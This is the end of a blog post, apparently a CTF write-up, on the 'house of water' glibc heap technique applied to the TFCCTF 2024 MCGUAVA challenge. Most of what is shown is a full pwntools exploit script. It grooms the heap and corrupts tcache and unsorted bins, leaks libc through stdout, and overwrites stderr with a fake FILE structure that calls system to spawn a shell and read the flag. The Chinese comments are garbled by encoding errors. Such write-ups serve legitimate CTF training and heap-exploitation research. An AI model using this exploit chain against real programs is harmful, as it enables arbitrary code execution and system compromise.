class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;*&gt;&#x27;</span>,timeout = <span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index=<span class="number">0</span>,content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;how many guavas:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavset:&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavas:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guava no:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process([<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">            env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¿™ä¸¤ä¸ªå¾ªç¯ä¸ºå¤šä½™æ“ä½œï¼Œå½“æ—¶è„‘æŠ½å†™çš„ï¼Œåé¢æ‡’çš„åˆ äº†</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å– fake 0x30 å’Œ unsorted_start å †å—çš„ç´¢å¼•</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">    add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å– fake 0x20 å’Œ unsorted_end å †å—çš„ç´¢å¼•</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 17</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 18 fake 0x20</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 19</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 20</span></span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">19</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 21</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 22 unsorted_end</span></span><br><span class="line">    free(<span class="number">21</span>)</span><br><span class="line">    free(<span class="number">22</span>)</span><br><span class="line">    add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x21</span>)) <span class="comment"># 23</span></span><br><span class="line">    free(<span class="number">23</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 24</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 25 unsorted_end</span></span><br><span class="line">    add(<span class="number">0x6e0</span>) <span class="comment"># 26</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å– unsorted_middle çš„ç´¢å¼•</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 27 unsorted_middle</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 28</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¼ªé€  fake unsorted chunk ï¼ˆsizeã€fdã€bkï¼‰</span></span><br><span class="line">    add(<span class="number">0x3e8</span>) <span class="comment"># 29</span></span><br><span class="line">    add(<span class="number">0x3d8</span>) <span class="comment"># 30</span></span><br><span class="line">    free(<span class="number">29</span>)</span><br><span class="line">    free(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å–ä¸€ä¸ª tcache çš„ç´¢å¼•ï¼Œè¯¥ tcache èƒ½å¤Ÿä¿®æ”¹ fake 0x30 å’Œ unsorted_start</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x300</span>) <span class="comment"># 31</span></span><br><span class="line">    add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 32</span></span><br><span class="line">    add(<span class="number">0x330</span>) <span class="comment"># 33 change unsorted_start</span></span><br><span class="line">    free(<span class="number">33</span>)</span><br><span class="line">    add(<span class="number">0x1e0</span>) <span class="comment"># 34</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å–ä¸€ä¸ª tcache çš„ç´¢å¼•ï¼Œè¯¥ tcache èƒ½å¤Ÿä¿®æ”¹ fake 0x20 å’Œ unsorted_end</span></span><br><span class="line">    free(<span class="number">24</span>)</span><br><span class="line">    free(<span class="number">25</span>)</span><br><span class="line">    add(<span class="number">0x300</span>) <span class="comment"># 35</span></span><br><span class="line">    add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 36</span></span><br><span class="line">    add(<span class="number">0x340</span>) <span class="comment"># 37 change unsorted_end</span></span><br><span class="line">    free(<span class="number">37</span>)</span><br><span class="line">    add(<span class="number">0x1d0</span>) <span class="comment"># 38</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x330</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 39</span></span><br><span class="line">    free(<span class="number">39</span>) </span><br><span class="line">    add(<span class="number">0x340</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 40</span></span><br><span class="line">    free(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åœ¨åé¢å¡«å……å †å—ï¼Œå¹¶ä¼ªé€  prev_size å’Œ size ä½¿ fake unsorted chunk åˆæ³•</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">        add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x210</span>) <span class="comment"># 76</span></span><br><span class="line">    add(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(<span class="number">0x10000</span>)+p64(<span class="number">0x20</span>)) <span class="comment"># 77</span></span><br><span class="line">    <span class="comment"># æå‰è®© 0x240ã€0x250 ä¸¤ä¸ªå¤§å°çš„å †å—è¿›å…¥åˆ° tcacheï¼Œåé¢ä¼šç”¨ä¸Š</span></span><br><span class="line">    add(<span class="number">0x238</span>) <span class="comment">#78</span></span><br><span class="line">    add(<span class="number">0x248</span>) <span class="comment">#79</span></span><br><span class="line">    free(<span class="number">78</span>)</span><br><span class="line">    free(<span class="number">79</span>)</span><br><span class="line">    <span class="comment"># ä¾æ¬¡é‡Šæ”¾ unsorted_endã€unsorted_middleã€unsorted_start</span></span><br><span class="line">    free(<span class="number">25</span>)</span><br><span class="line">    free(<span class="number">27</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä»¤ unsorted_start çš„ fd æŒ‡é’ˆå’Œ unsorted_end çš„ bk æŒ‡é’ˆæŒ‡å‘ fake unsorted chunk</span></span><br><span class="line">    add(<span class="number">0x330</span>,<span class="number">0x20</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 80</span></span><br><span class="line">    free(<span class="number">80</span>)</span><br><span class="line">    add(<span class="number">0x340</span>,<span class="number">0x28</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 81</span></span><br><span class="line">    free(<span class="number">81</span>)</span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        add(<span class="number">0x500</span>) <span class="comment"># 82</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†å¤šä½™çš„ largebin ç”³è¯·å‡ºæ¥</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 83</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¿®æ”¹</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) <span class="comment"># 84</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) <span class="comment"># 85</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">0x230</span>,<span class="number">0</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x00&#x27;</span>) <span class="comment"># 86</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    libc_base = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">        libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219aa0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hex</span>(libc_base)[<span class="number">2</span>] != <span class="string">&#x27;7&#x27;</span> <span class="keyword">or</span> <span class="built_in">hex</span>(libc_base)[<span class="number">3</span>] != <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;leak libc error&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># é‡Šæ”¾ tcache_perthread_struct ä¸Šçš„å †å—ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿå†æ¬¡ç¼–è¾‘è¯¥ç»“æ„ä½“</span></span><br><span class="line">    free(<span class="number">86</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä»¤ size ä¸º 0x250 çš„ tcache æŒ‡å‘ _IO_2_1_stderr_</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0x8</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>])) <span class="comment"># 87</span></span><br><span class="line"></span><br><span class="line">    fake_file = flat(&#123;</span><br><span class="line">        <span class="number">0x0</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">        <span class="number">0x28</span>: libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line">        <span class="number">0x88</span>: libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">        <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]-<span class="number">0x40</span>,   <span class="comment"># _wide_data</span></span><br><span class="line">        <span class="number">0xD8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># jumptable </span></span><br><span class="line">    &#125;, filler=<span class="string">b&quot;\x00&quot;</span>) </span><br><span class="line"></span><br><span class="line">    <span class="comment"># åœ¨ _IO_2_1_stderr_ ä¸Šå†™ä¸Šæˆ‘ä»¬çš„ fake file</span></span><br><span class="line">    add(<span class="number">0x240</span>,<span class="number">0</span>,fake_file)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># é€€å‡ºç¨‹åºï¼Œæ‰§è¡Œ fsop æ”»å‡»</span></span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>ç”±äºéœ€è¦åˆ†åˆ«åœ¨ heapbase å’Œ stdout ä¸Šè¿›è¡Œä¸€æ¬¡çˆ†ç ´ï¼Œæ‰€ä»¥è„šæœ¬æ‰§è¡Œçš„æˆåŠŸç‡ä¸º 1&#x2F;256ï¼Œè¿è¡Œåè¿˜è¦ç­‰åŠå¤©</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/18.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>æ‰“é€šï¼Œå®Œç»“æ•£èŠ±ğŸ‚ğŸº</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/friend/">link</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-water"><span class="toc-number">1.</span> <span class="toc-text">house of water</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">æ¦‚è¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Demo"><span class="toc-number">1.2.</span> <span class="toc-text">Attack Demo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#house-of-water-c"><span class="toc-number">1.2.1.</span> <span class="toc-text">house_of_water.c</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.2.</span> <span class="toc-text">æ€»ç»“</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TFCCTF-2024-MCGUAVA"><span class="toc-number">2.</span> <span class="toc-text">TFCCTF 2024 MCGUAVA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ida%E4%BC%AA%E4%BB%A3%E7%A0%81"><span class="toc-number">2.0.1.</span> <span class="toc-text">idaä¼ªä»£ç </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.0.2.</span> <span class="toc-text">æ¼æ´åˆ†æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%A0%86%E5%9D%97%E7%B4%A2%E5%BC%95"><span class="toc-number">2.0.3.</span> <span class="toc-text">è·å–å †å—ç´¢å¼•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%83%BD%E5%A4%9F%E4%BF%AE%E6%94%B9-unsorted-start-%E5%92%8C-unsorted-end-%E7%9A%84%E5%A0%86%E5%9D%97"><span class="toc-number">2.0.4.</span> <span class="toc-text">è·å–èƒ½å¤Ÿä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„å †å—</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-fake-unsorted-chunk-%E7%9A%84prev-size-%E5%92%8C-size"><span class="toc-number">2.0.5.</span> <span class="toc-text">ä¼ªé€  fake unsorted chunk çš„prev_size å’Œ size</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">2.0.6.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&text=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&is_video=false&description=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=house of water &amp; TFCCTF 2024 MCGUAVA&body=Check out this article: https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&title=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&name=house of water &amp; TFCCTF 2024 MCGUAVA&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/&t=house of water &amp; TFCCTF 2024 MCGUAVA"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    Qanux
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">link</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->


 
  <link
    rel="preload"
    href="/lib/font-awesome/css/all.min.css"
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript
    ><link
      rel="stylesheet"
      href="/lib/font-awesome/css/all.min.css"
  /></noscript>


    <!-- jquery -->

  
<script src="/lib/jquery/jquery.min.js"></script>





<!-- clipboard -->

  
    
<script src="/lib/clipboard/clipboard.min.js"></script>

  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
